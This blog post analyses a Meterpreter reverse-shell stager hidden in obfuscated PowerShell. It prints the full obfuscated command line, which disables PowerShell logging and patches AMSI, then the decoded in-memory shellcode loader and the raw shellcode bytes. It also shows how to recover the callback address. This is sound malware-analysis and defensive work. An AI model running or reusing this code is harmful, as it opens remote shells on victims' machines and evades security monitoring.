---
tags: PowerShell-Analysis
---
## Meterpreter Shellcode Obfuscated in PowerShell
Taking apart a Meterpreter Payload encoded within an obfuscated PowerShell script.

Below is an example of a command line which is often associated with exploitation attempts via Metasploit

```powershell
C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -nop -w hidden -noni -c <!#-- if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c
$x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new();
$gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u''));
$plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a''));
if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null);
If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}
{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object
System.IO.MemoryStream(,
[System.Convert]::FromBase64String(((''''H4sIA{1}wxYWUA/7VWbW/aShP9X''+''qn/waqQsHUJmJf2kkiVnjX{1}QIOJiQMkUFRt7MVsWXuJvQ5Bvf3vnfV{0}QtSkzXOvasnCXs/M''+''zp45c4ZV{1}rqC8lCh723l29s3Sn7ZOMKBopbcGW/fV5QS3WqPH0t+m42Uj4q6QNttlweYhsuTk04SRSQU2Xu1RwSKYx{0}cM{1}piVVP+UWZr{1}pGj85uvxBXKN6X0pdpj/Aaz3Gzfwe6aK{1}co9OS3IXexTKzqbBkVavnz57K2OKovq6e3CWaxWnb2sSBB1WOsrCnfNbnh5X5{0}1{0}JF3YjHfCWqMxo2G9VJGOMVGUG0O2IRseZeXIbDPB4nIiKJwuxUMkxmpJbh0Y64izwvInFcrig{0}ucFiufyfush3v0hCQ''+''QNSHYSCRHzrkOiOuiSu9nHoMXJBVkvwckR{1}Q3+paWB2xzd{1}{0}YUJYxXl/wmjjsiuwO61Tuqh{1}1jZItIqUNNnzmlx{0}2{1}k8yw/k2jGAw2ujAuA33cJ4QN9Alz/0n2GQI8{0}xbVIvxDIWbV5TFPvj4peUSzYHQse7eG1dBklRFs+IK6UghY6q7w2Wr1wBce7XgIriymn3v{0}R/wkBSqvb3vS9tHqZz12yoiHp7kMcU{0}eg7BO{1}i7KQFYNXSd3''+''CbAQZquX8A/G6hB{1}fCwm0ZMdPbqcBFQ++RkKZRy{0}kQmljyAqqrj1NJqudWh6{1}FgkAvuwd6FpaQaOQwjpvjn2xu3wHo3KH4TiuKHYCnepWFIdgRryKgsKY5p9QInj6KFsgT9dKmKAujkURbnmoDyme+b4dHsYiSlyo{0}GBw6WyJSzGTkFSUPvWIsXeoX+x/sMMBIB3MGHQQR{0}qDgsCKBMIRki8RpJpyQ6s6RAyC{0}SMB2KTSYT{0}sg1DkfZISDPv{1}k83/bKZFP2Tkl9gUoBzkCQV3GBcVZUojA''+''UokcQaK/assfpag{0}J1ORPICqUWj{0}Yy9kI1QCofjxkZSNYcpBSUSAIgZ8cDAMfnQygRHfVc7pzaC67rbdyiZbmh9sIPbgntCmwNurdq20HlguZ3Y7pltRHf+zm2PkOt98sixA3bjaUt0bNQfU91orV1Dv0yf/Wta933kjcZrl+n26ea+1op1uuvPZKwshttq9a''+''901Gy2zpv6BgCUPhvwCejufgjPoKznQ2MQG/qAnX7qXNzMGuZ8xvq1lrlezXjsf{0}ju1mq1Yw93rT1CBvea1v6qfs{1}v+25gt{1}JeO+60NugUoU54OjUNfnZtRMiuTbG/5bszH6GZ30HorzUl8/H{1}NMZj00CT3tfb7nHNrx3PrvDam{1}0bd{0}69uljDu7nrj62a3hp45J63hzM6vZOxjFvDnF9hNJzvzVqtfh038MbgyABgzfkt6q2vt6bNwP9y0uBoykaPtuN+9''+''8yd1/+OrY/voJK{0}CQ1Fs7GUjdmUovf2TYm5x+2Dcr4k6haO4jVm''+''UGZQ66{0}nTB6ZuQDbH{1}KDCKpyjm9IFBIGow+GY8FTxBh3pfxnSg2zJ5sIckBN4BHSeu5JgyGfG4{0}4F3OhWDo5mUOWwP2UldUhCX2xruj3TV0HQdfv9VbK8tcfrsO3e5g6Mhr4Q2AJz0N8lsaHkHSlq{0}8dnv''+''8ZMhj+AhToF6C9hB/svQHBAAn{0}mliiaHDODjHMj/bAiScQAnZ1OP5Cjv6U{0}RDiiNwqJVBSoh3O2VJyc37zRwmUq9{1}afrzf{1}uhx7RdfX0UqvZIh9NPy04UDMf9z{1}MwwFWDogKoyko37F5DIu+agz{0}I+0BKr''+''/J{0}/hM8TcTSCf1aptv8AyS{1}BNoI{0}AAA='')-f''L'',''E'')))),
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```

Obfuscation is used in the form of concatenating the base64 encoded string, and gzip compression.
We can identify the value of the arrays after a given sequence by looking for the '-f' argument.

"-f''L'',''E''"

{0} = L

{1} = E

Then it's a case of getting the Base64 encoded string, removing the concatenations and replacing the array values.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b813cf1a-4d3a-4b1d-86ef-17d99456d3b5)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d8739fc4-2063-4328-a35a-b8d931da62ae)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5108a2ac-dbb7-4ff2-a75c-c4623fc25fc8)




Next, we'll add a From Base64 and Gunzip operator to reveal the following code:

```powershell
function i5P {
        Param ($cWo8x, $ip)
        $g8lN = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $g8lN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($g8lN.GetMethod('GetModuleHandle')).Invoke($null, @($cWo8x)))), $ip))
}

function ma1_D {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m4AK,
                [Parameter(Position = 1)] [Type] $vGu = [Void]
        )

        $fqGV5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $fqGV5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m4AK).SetImplementationFlags('Runtime, Managed')
        $fqGV5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vGu, $m4AK).SetImplementationFlags('Runtime, Managed')

        return $fqGV5.CreateType()
}

[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQV4tCPAHQi0B4hcB0TAHQi0gYi1ggAdNQhcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpowKgAAWgCAA+hieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM=")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($nLQ2k, 0, $lc98, $nLQ2k.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualProtect), (ma1_D @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lc98, [Uint32]$nLQ2k.Length, 0x10, [Ref]$fal3)) -eq $true) {
        $ubOb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll CreateThread), (ma1_D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lc98,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll WaitForSingleObject), (ma1_D @([IntPtr], [Int32]))).Invoke($ubOb,0xffffffff) | Out-Null
}
```

This [articale](https://isc.sans.edu/diary/Fileless+Malicious+PowerShell+Sample/23081) from SANS probably does a better job of explaining the grittier details of this script.

But what we are interested in is the Base64 string.
We'll throw it into CyberChef and add a From Base64 and To Hex operator to reveal the shellcode

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/80ecde0b-f1b1-4185-a322-9f616a2fe4e7)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7c49af16-e21f-4871-817b-017094a1c3ab)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a544358b-3b91-426a-b8fb-d49f52f2c702)




```
fc e8 8f 00 00 00 60 31 d2 89 e5 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 31 ff 0f b7 4a 26 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 49 75 ef 52 8b 52 10 57 8b 42 3c 01 d0 8b 40 78 85 c0 74 4c 01 d0 8b 48 18 8b 58 20 01 d3 50 85 c9 74 3c 49 31 ff 8b 34 8b 01 d6 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e0 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 e9 80 ff ff ff 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 89 e8 ff d0 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 0a 68 c0 a8 00 01 68 02 00 0f a1 89 e6 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0c ff 4e 08 75 ec 68 f0 b5 a2 56 ff d5 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 01 c3 29 c6 75 ee c3
```

Then with this shellcode, we can use a x86 Dissassembler to reveal the instructions.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8408cee5-eb25-4b97-9c69-e4d3a2662760)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/00b20d83-8eba-4fba-b1de-2773dd0d4b13)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f808fc0b-ad87-486e-a540-8a7bdcd0758d)




To find the IP which the shell will call back to, we need to look for the PUSH instructions above the MOV ESI,ESP instruction, which is above multiple PUSH RAX insutrctions

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5a5efcb0-f9c4-4bde-a647-ccdc421dc1b4)

By taking the Hex contents of the first PUSH instruction, after 68 (Which is just the instruction to PUSH), we get C0A80001, converting this From Hex, To Decimal, we get our source IP: 192.168.0.1

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b72c9cec-eb6f-40bf-9f31-56d0b864d465)









<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-48M02RY99Q"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-48M02RY99Q');
</script>


